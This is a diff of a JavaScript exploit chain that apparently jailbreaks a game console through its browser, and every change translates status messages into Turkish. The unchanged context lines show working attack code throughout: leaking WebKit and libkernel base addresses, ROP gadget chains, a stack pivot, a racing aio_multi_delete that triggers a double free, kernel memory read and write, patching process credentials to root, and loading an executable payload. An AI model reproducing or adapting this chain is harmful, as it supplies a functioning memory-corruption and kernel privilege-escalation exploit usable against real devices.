@@ -313,7 +313,7 @@ function makeRpc(worker) {
         const libkernelBase = p.read8(g(off.wk___imp___error)).sub32(off.k__error);
         mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
         if (!plausibleBase(webkitBase) || !plausibleBase(libkernelBase)) {
-            state("a base looks wrong", "bad"); return;
+            state("Bellek başlangıç adresi geçersiz", "bad"); return;
         }
 
         const GADGETS = [
@@ -373,17 +373,17 @@ function makeRpc(worker) {
         }
         check("gadget-table-fits-module", !fatal,
             gated + "/" + GADGETS.length + " gated");
-        if (fatal) { state("gadget bytes did not match", "bad"); return; }
+        if (fatal) { state("Gerekli komut verileri eşleşmedi", "bad"); return; }
         const argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET,
                            G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];
         check("5-argument-calls-possible-pop-r8", !!argGadget[4], "");
-        if (!argGadget[4]) { state("no pop r8", "bad"); return; }
+        if (!argGadget[4]) { state("Gerekli bellek komutu bulunamadı (pop r8)", "bad"); return; }
 
         const SYS9 = { mmap: 0x1dd, jitshm_create: 0x215, kexec: 0x295 };
         const wanted = [];
         for (const k in SYS) wanted.push(SYS[k]);
         for (const k in SYS9) wanted.push(SYS9[k]);
-        state("scanning libkernel for syscall stubs...", "warn");
+        state("Sistem çağrıları için çekirdek kitaplığı taranıyor...", "warn");
         const tScan = Date.now();
         const stubRva = new Map();
 
@@ -433,7 +433,7 @@ function makeRpc(worker) {
             missing.length === 0,
             missing.length ? "missing: " + missing.join(",")
                 : Object.keys(SYS).length + "/" + Object.keys(SYS).length);
-        if (missing.length) { state("missing syscall stubs", "bad"); return; }
+        if (missing.length) { state("Gerekli sistem çağrıları bulunamadı", "bad"); return; }
 
         {
             const got9 = [];
@@ -492,7 +492,7 @@ function makeRpc(worker) {
         }
         const mainCtx = makeCtx("main"), wrkCtx = makeCtx("worker");
         check("chain-contexts-round-tripped", !!mainCtx && !!wrkCtx, "");
-        if (!mainCtx || !wrkCtx) { state("backing stores failed", "bad"); return; }
+        if (!mainCtx || !wrkCtx) { state("Bellek alanları hazırlanamadı", "bad"); return; }
 
         function layout(c, insts, targetIdx) {
             c.stackU8.fill(0); c.frameU8.fill(0);
@@ -556,7 +556,7 @@ function makeRpc(worker) {
         const mFuncAt = execAddr.add32(off.wk_JSFunction_m_function);
         origNative = p.read8(mFuncAt);
         if (!sameI64(origNative, nativeFn)) {
-            state("m_function moved under us", "bad"); return;
+            state("İşlevin bellek adresi değişti; işlem durduruldu", "bad"); return;
         }
         const mainPivotObj = {};
         keepAlive.push(mainPivotObj);
@@ -629,7 +629,7 @@ function makeRpc(worker) {
                               mainCtx.frameDv.getUint32(12, true));
         check("main-thread-pivot-lands", sameI64(wit, mainCtx.P),
             wit + " want " + mainCtx.P);
-        if (!sameI64(wit, mainCtx.P)) { state("pivot failed", "bad"); return; }
+        if (!sameI64(wit, mainCtx.P)) { state("Bellek yönlendirmesi başarısız", "bad"); return; }
         const pid = sc(SYS.getpid).i32;
         mark("PID", String(pid));
 
@@ -703,7 +703,7 @@ function makeRpc(worker) {
                 return c.join(",");
             })() + " are available to this process)");
 
-        state("wiring the worker...", "warn");
+        state("Yardımcı işlem hazırlanıyor...", "warn");
         worker = new Worker("rpc_worker.js");
         rpc = makeRpc(worker);
         await rpc("ping");
@@ -712,7 +712,7 @@ function makeRpc(worker) {
         const D = bufAddr(markerArr.buffer);
         if ((p.read4(D) >>> 0) !== SENT_LO) {
             check("transferred-store-worker-memory", false, "D=" + D);
-            state("transfer did not preserve the store", "bad"); return;
+            state("Aktarım sırasında bellek alanı korunamadı", "bad"); return;
         }
         function ptrish(v) { return v.hi > 0 && v.hi < 0x10000 && (v.low & 7) === 0; }
         const storage = p.read8(D.add32(0x10));
@@ -720,7 +720,7 @@ function makeRpc(worker) {
         if (!markerCell || !ptrish(markerCell)) {
             check("walk-reached-worker-marker", false,
                 "storage=" + storage + " cell=" + markerCell);
-            state("walk failed -- run step 4b for the dump", "bad"); return;
+            state("Bellek taraması başarısız — döküm için 4b adımını çalıştırın", "bad"); return;
         }
         const butterfly = p.read8(markerCell.add32(8));
         let wMaster = null, wVictim = null, wLeak = null;
@@ -735,7 +735,7 @@ function makeRpc(worker) {
         }
         check("walk-found-worker-victim-master",
             !!(wMaster && wVictim && wLeak), "master=" + wMaster);
-        if (!(wMaster && wVictim && wLeak)) { state("walk failed", "bad"); return; }
+        if (!(wMaster && wVictim && wLeak)) { state("Bellek taraması başarısız", "bad"); return; }
         wMasterAddr = wMaster;
         origWorkerVector = p.read8(wMaster.add32(0x10));
         p.write8(wMaster.add32(0x10), wVictim);
@@ -764,7 +764,7 @@ function makeRpc(worker) {
         check("worker-answers-before-arm",
             (await rpc("ping")) === "pong", "");
 
-        state("setting up the aio batches...", "warn");
+        state("Giriş/çıkış işlemleri hazırlanıyor...", "warn");
         const pairBuf = alloc(8);
         if (sc(SYS.socketpair, 1, SOCK_STREAM, 0, pairBuf.addr).i32 === -1)
             throw new Error("socketpair failed");
@@ -802,7 +802,7 @@ function makeRpc(worker) {
         }
         mark("SPRAY-CANCELLED", "");
 
-        state("dry run: everything but the racing delete...", "warn");
+        state("Ön denetim yapılıyor; silme işlemi uygulanmıyor...", "warn");
         servAddr.dv.setUint8(0, 16);
         servAddr.dv.setUint8(1, AF_INET);
         servAddr.dv.setUint16(2, 0x8d13, true);
@@ -822,7 +822,7 @@ function makeRpc(worker) {
         check("loopback-server-socket-bound-listening",
             br === 0 && lr2 === 0, "bind=" + br + " listen=" + lr2
             + " fd=" + server);
-        if (br !== 0 || lr2 !== 0) { state("could not set up the server", "bad"); }
+        if (br !== 0 || lr2 !== 0) { state("Sunucu hazırlanamadı", "bad"); }
 
         const PIPE_SYS = 42, F_SETFL = 4, O_NONBLOCK = 4;
         const FIOSETOWN = 0x8004667c;
@@ -954,7 +954,7 @@ function makeRpc(worker) {
             + "  affinity main=" + ma + " worker=" + wa);
         if (!(mp === 0 && wp === 0 && ma === 0 && wa === 0)) {
             mark("REFUSING-TO-ARM", "reason=core-pin-failed");
-            state("could not pin -- refusing to arm", "bad");
+            state("İşlem sabitlenemedi — başlatma durduruldu", "bad");
             mark("PROOF-SUMMARY", "pass=" + passCount + " fail=" + failCount);
             return;
         }
@@ -975,14 +975,14 @@ function makeRpc(worker) {
             if (!stubAddr.get(SYS[nm])) {
                 check("stub for " + nm, false, "");
                 mark("REFUSING-TO-ARM", "reason=no-stub:" + nm);
-                state("missing " + nm, "bad");
+                state("Eksik bileşen: " + nm, "bad");
                 mark("PROOF-SUMMARY", "pass=" + passCount + " fail=" + failCount);
                 return;
             }
         }
         if (!(wTid !== 0 && wTid !== myTid)) {
             mark("REFUSING-TO-ARM", "reason=no-worker-tid");
-            state("no worker tid", "bad");
+            state("Yardımcı işlemin kimliği bulunamadı", "bad");
             mark("PROOF-SUMMARY", "pass=" + passCount + " fail=" + failCount);
             return;
         }
@@ -1011,7 +1011,7 @@ function makeRpc(worker) {
             ipv6Socks.length + "/" + IPV6_SOCK_NUM
             + " AF_INET6 sockets, rthdr len 0x" + sprayRthdrLen.toString(16));
         if (ipv6Socks.length !== IPV6_SOCK_NUM) {
-            state("cannot stand up the reclaim -- refusing to arm", "bad");
+            state("Bellek geri alma işlemi hazırlanamadı — başlatma durduruldu", "bad");
             mark("REFUSING-TO-ARM", "reason=no-reclaim-ready");
             mark("PROOF-SUMMARY", "pass=" + passCount + " fail=" + failCount);
             return;
@@ -1050,7 +1050,7 @@ function makeRpc(worker) {
             return null;
         }
 
-        state("racing...", "warn");
+        state("Bellek zamanlaması deneniyor...", "warn");
         mark("ARMED", "one core " + ONE_CORE + ", suspend rendezvous, attempts=" + ATTEMPTS
             + "  -- the worker now issues a REAL aio_multi_delete");
 
@@ -1325,7 +1325,7 @@ function makeRpc(worker) {
             mark("DOUBLE-FREE-ACHIEVED", "fds " + twinSocks.join(" and ")
                 + " now alias one 0x80 allocation");
 
-            state("leaking kernel addresses...", "warn");
+            state("Çekirdek adresleri belirleniyor...", "warn");
             const leakOk = (function () {
                 function getRthdr(sock, size) {
                     leakLen.dv.setInt32(0, size, true);
@@ -1556,7 +1556,7 @@ function makeRpc(worker) {
                     + " dirty_fd=" + dirty);
                 mark("STAGE-2-DONE", "reqs1/reqs2/aio_info/target_id in hand");
 
-                state("stage 3: crafting the aio queue entry...", "warn");
+                state("Aşama 3: giriş/çıkış kuyruğu hazırlanıyor...", "warn");
 
                 sc(SYS.evf_delete, evf);
                 mark("EVF-DELETED", hx(evf));
@@ -1746,7 +1746,7 @@ function makeRpc(worker) {
                     + " alias one 0x100 allocation. make_karw is step 4i, and "
                     + "it is the first point where any of this can be repaired.");
 
-                state("stage 4: kernel read...", "warn");
+                state("Aşama 4: çekirdek belleği okunuyor...", "warn");
 
                 sprayRthdr.u8.fill(0);
                 const karwLen = buildRthdr(sprayRthdr, 0x100);
@@ -2026,7 +2026,7 @@ function makeRpc(worker) {
                 mark("KREAD-STATS", kreadCalls + " kread8 calls, "
                     + kreadFail + " failed");
 
-                state("stage 5: kernel write...", "warn");
+                state("Aşama 5: çekirdek belleğine yazılıyor...", "warn");
 
                 const kwTarget = pktinfoSelf.sub32(8);
                 const KW_A = 0x4b571337, KW_B = 0xfeedc0de;
@@ -2097,7 +2097,7 @@ function makeRpc(worker) {
                             + "aim=verified selfref=restored");
                 }
 
-                state("stage 6: locating the kernel base...", "warn");
+                state("Aşama 6: çekirdek başlangıç adresi bulunuyor...", "warn");
                 const KSTR_RESIDUE = evfCv.low & 0x3fff;
                 const KSTR_LO = params.has("kstrlo")
                     ? parseInt(params.get("kstrlo"), 16) : 0x780000;
@@ -2272,7 +2272,7 @@ function makeRpc(worker) {
                                     + "the cleanup list -- closing master would "
                                     + "kmem_free slave's struct pipe");
 
-                                state("building KernelView...", "warn");
+                                state("Çekirdek bellek görünümü hazırlanıyor...", "warn");
 
                                 function toI64(v) {
                                     return (typeof v === "number")
@@ -2706,7 +2706,7 @@ function makeRpc(worker) {
                                         + "nothing is closed.");
                                 } else {
 
-                                state("stage 7: repairing the aliases...", "warn");
+                                state("Aşama 7: bellek eşlemeleri onarılıyor...", "warn");
 
                                 const PKTOPTS_M = 0x00;
                                 const PKTOPTS_RTHDR = 0x68;
@@ -2936,7 +2936,7 @@ function makeRpc(worker) {
                                         + "writes on top of that is how a clean "
                                         + "failure becomes a panic.");
                                 } else try {
-                                    state("stage 8: jailbreak...", "warn");
+                                    state("Aşama 8: sistem erişimi etkinleştiriliyor...", "warn");
 
                                     const P_LIST_NEXT = 0x00, P_LIST_PREV = 0x08;
                                     const P_UCRED = 0x40, P_FD = 0x48, P_PID = 0xb0;
@@ -3141,7 +3141,7 @@ function makeRpc(worker) {
                                         + " kbase=" + (kbase || "null")
                                         + " blob=" + (kpatch ? kpatch.length : 0));
                                 } else try {
-                                    state("stage 9: Çekirdek yamaları uygulanıyor...", "warn");
+                                    state("Aşama 9: çekirdek yamaları uygulanıyor...", "warn");
                                     const sysent = kbase.add32(SYSENT_661);
                                     const gadget = kbase.add32(JMP_RSI_GADGET);
 
@@ -3355,7 +3355,7 @@ function makeRpc(worker) {
                                     mark("PAYLOAD-SKIPPED", "reason=payload=0");
                                 else if (payload && (kpatched || params.get("payload") === "1"))
                                     try {
-                                    state("stage 10: loading the payload...", "warn");
+                                    state("Aşama 10: yük dosyası yükleniyor...", "warn");
 
                                     const psize = (payload.length + 0x3fff) & ~0x3fff;
                                     const pr = PROT_READ | PROT_WRITE | PROT_EXEC;
@@ -3584,17 +3584,17 @@ function makeRpc(worker) {
                 ? "karw=1 repair=0 root=0"
                 : "doublefree=1 reclaim=1 karw=pktopts kv=0");
 
-            state(repaired ? "REPAIRED -- tearing down..."
-                : kv ? "KERNELVIEW LIVE -- REBOOT"
-                     : "DOUBLE FREE ACHIEVED -- REBOOT", "warn");
+            state(repaired ? "Bellek onarıldı — işlem kaynakları temizleniyor..."
+                : kv ? "Çekirdek bellek erişimi etkin — konsolu yeniden başlatın"
+                     : "Çift bellek serbest bırakma tamamlandı — konsolu yeniden başlatın", "warn");
             if (jailbroken) mark("JAILBROKEN", "uid=0 cr_sceAuthId=SYSCORE "
                 + "cr_sceCaps=-1 fd_rdir=rootvnode fd_jdir=rootvnode");
         } else if (committed) {
             state("Bellek geri alınamadı — konsolu şimdi yeniden başlatın", "bad");
         } else if (failCount === 0) {
-            state("no win in " + attemptsUsed + " attempts", "warn");
+            state(attemptsUsed + " denemede sonuç alınamadı", "warn");
         } else {
-            state("see log", "bad");
+            state("Ayrıntılar için işlem günlüğüne bakın", "bad");
         }
 
     } catch (e) {
